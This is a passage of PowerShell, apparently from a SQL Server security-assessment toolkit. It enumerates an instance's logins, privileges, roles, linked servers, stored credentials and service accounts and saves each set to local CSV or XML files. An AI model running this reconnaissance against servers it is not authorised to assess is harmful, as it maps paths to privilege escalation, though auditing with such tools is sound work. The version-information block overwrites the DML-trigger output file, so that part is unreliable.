        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_columns.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_columns.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Logins
        Write-Verbose -Message "$Instance - Getting server logins..."
        $Results = Get-SQLServerLogin -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_logins.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_logins.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Logins
        Write-Verbose -Message "$Instance - Getting server configuration settings..."
        $Results = Get-SQLServerConfiguration -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_Configuration.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_Configuration.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Privs
        Write-Verbose -Message "$Instance - Getting server privileges..."
        $Results = Get-SQLServerPriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_privileges.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_privileges.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Roles
        Write-Verbose -Message "$Instance - Getting server roles..."
        $Results = Get-SQLServerRole -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_roles.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_roles.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Role Members
        Write-Verbose -Message "$Instance - Getting server role members..."
        $Results = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_rolemembers.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_rolemembers.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Links
        Write-Verbose -Message "$Instance - Getting server links..."
        $Results = Get-SQLServerLink -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_links.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_links.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Credentials
        Write-Verbose -Message "$Instance - Getting server credentials..."
        $Results = Get-SQLServerCredential -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_credentials.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_credentials.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Service Accounts
        Write-Verbose -Message "$Instance - Getting SQL Server service accounts..."
        $Results = Get-SQLServiceAccount -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Service_accounts.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Service_accounts.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Stored Procedures
        Write-Verbose -Message "$Instance - Getting stored procedures..."
        $Results = Get-SQLStoredProcedure -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_stored_procedure.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_stored_procedure.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Triggers DML
        Write-Verbose -Message "$Instance - Getting DML triggers..."
        $Results = Get-SQLTriggerDml -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_dml.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_dml.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Triggers DDL
        Write-Verbose -Message "$Instance - Getting DDL triggers..."
        $Results = Get-SQLTriggerDdl -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_ddl.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_ddl.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Version Information
        Write-Verbose -Message "$Instance - Getting server version information..."
        $Results = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_dml.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_dml.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        Write-Verbose -Message "$Instance - END"
    }

    End
    {
    }
}

#endregion
